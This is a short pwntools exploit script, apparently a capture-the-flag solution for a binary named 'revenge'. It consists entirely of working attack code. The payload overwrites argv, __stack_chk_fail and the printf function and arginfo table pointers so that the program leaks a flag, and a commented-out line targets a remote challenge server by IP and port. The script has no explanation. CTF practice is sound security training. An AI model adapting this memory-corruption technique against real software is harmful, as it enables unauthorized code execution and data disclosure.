from pwn import *

p = process('./revenge')
#p = remote('117.50.39.111',26436)

flag_addr = 0x6b4040
name_addr = 0x6b73e0
argv_addr = 0x6b7980
func_table = 0x6b7a28
arginfo_table = 0x6b7aa8
stack_chk_fail = 0x4359b0

payload = p64(flag_addr)
payload += '\x00'*(0x73*8-len(payload))
payload += p64(stack_chk_fail)
payload += '\x00'*(0x6b7980 - 0x6b73e0 - len(payload))
payload += p64(name_addr)
payload += '\x00'*(0x6b7a28 - 0x6b73e0 - len(payload))
payload += p64(0x100)
payload += '\x00'*(0x6b7aa8 - 0x6b73e0 - len(payload))
payload += p64(name_addr)

#gdb.attach(p)
p.sendline(payload)
p.interactive()
